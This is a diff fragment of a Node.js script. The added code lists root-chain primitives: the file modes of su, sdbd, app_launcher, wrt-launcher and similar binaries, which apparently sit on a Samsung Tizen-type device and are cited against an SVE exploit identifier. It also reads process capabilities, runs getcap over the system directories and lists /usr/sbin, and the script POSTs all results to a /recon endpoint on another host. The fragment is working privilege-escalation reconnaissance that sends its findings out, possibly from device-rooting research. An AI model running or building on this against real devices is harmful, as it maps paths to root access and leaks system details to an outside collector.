@@ -26,6 +26,14 @@ dirs.forEach(function (d) {
 out.setuid = suid;
 out.binCounts = bins;
 out.hasSu = exec('which su sudo');
+// Root-chain primitives (chris-ritsen / SVE-2025-50109 style)
+out.primitives = {};
+['/usr/bin/dotnet', '/usr/sbin/sdbd-tarlauncher', '/usr/bin/su', '/usr/sbin/sdbd', '/usr/bin/app_launcher', '/usr/bin/wrt-launcher'].forEach(function (p) {
+  try { var st = fs.statSync(p); out.primitives[p] = 'mode=' + st.mode.toString(8); } catch (e) { out.primitives[p] = 'ABSENT'; }
+});
+out.caps = read('/proc/self/status').split('\n').filter(function (l) { return l.indexOf('Cap') === 0; }).join('; ');
+out.getcap = exec('getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null');
+out.usrSbin = (function () { try { return fs.readdirSync('/usr/sbin').join(','); } catch (e) { return 'ERR'; } })();
 var body = JSON.stringify(out);
 var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, function (res) { });
 req.on('error', function (e) { });
